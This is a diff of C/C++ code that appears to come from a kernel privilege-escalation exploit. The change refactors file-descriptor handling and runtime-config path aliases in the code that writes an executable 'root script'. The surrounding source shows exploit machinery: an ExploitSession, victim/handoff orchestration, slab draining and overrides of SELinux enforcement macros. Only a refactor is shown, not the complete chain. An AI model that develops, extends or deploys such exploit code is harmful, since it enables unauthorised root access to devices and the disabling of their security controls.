@@ -8,6 +8,7 @@
 #include "common.h"
 #include "routes/route_controller.h"
 #include "profile.h"
+#include "support/native_resource.hpp"
 #include <ctype.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
@@ -20,9 +21,10 @@
 
 // TODO(post-S15:SESSION-01): Pass RuntimeConfig via ExploitSession.
 // Input: const session config; output: paths without process-global aliases.
-// Retained because victim/handoff orchestration remains centralized in main.
-#define g_home_dir (g_runtime_config.home_dir)
-#define g_root_script_path (g_runtime_config.root_script_path)
+// Retained because victim/handoff orchestration remains centralized in main;
+// the aliases expose stable c_str() pointers only at syscall/exec boundaries.
+#define g_home_dir (g_runtime_config.home_dir.c_str())
+#define g_root_script_path (g_runtime_config.root_script_path.c_str())
 
 /* Override target.h _OFF macros with the resolved runtime profile. */
 #undef SELINUX_ENFORCING_OFF
@@ -659,8 +661,9 @@ static void slab_drain(void) {
  * returning errors rather than modifying exploit state. */
 static void write_root_script(void) {
     char script[8192];
-    int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
-    if (sfd < 0) {
+    ghostlock::UniqueFd sfd(
+            open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755));
+    if (!sfd.valid()) {
         pr_warning("open root script failed path=%s errno=%d\n",
                 g_root_script_path, errno);
         return;
@@ -805,13 +808,12 @@ static void write_root_script(void) {
             g_home_dir);
     if (n < 0 || n >= (int) sizeof(script)) {
         pr_warning("root script too long\n");
-        close(sfd);
         return;
     }
-    if (write(sfd, script, (size_t) n) != n) {
+    if (write(sfd.get(), script, (size_t) n) != n) {
         pr_warning("write root script failed errno=%d\n", errno);
     }
-    close(sfd);
+    sfd.reset();
     chmod(g_root_script_path, 0755);
 }
 
